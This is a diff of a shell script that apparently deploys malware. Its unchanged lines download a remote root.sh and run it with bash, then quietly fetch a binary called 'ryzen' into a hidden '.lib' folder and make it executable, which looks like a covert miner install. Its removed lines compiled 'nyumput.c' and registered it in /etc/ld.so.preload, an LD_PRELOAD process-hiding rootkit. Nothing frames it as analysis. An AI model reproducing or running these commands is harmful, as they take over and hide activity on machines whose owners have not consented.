@@ -5,13 +5,7 @@ rm root.sh
 wget https://raw.githubusercontent.com/rifamanajul/All-Jobs/refs/heads/main/root.sh
 bash root.sh
 apt update 
-apt install -y wget curl sudo
-curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
+apt install -y wget curl sudo git
 mkdir .lib && cd .lib
 wget -O sgr1 https://bitbucket.org/hanafie1/all-jobs/downloads/ryzen >/dev/null 2>&1
 chmod +x sgr1
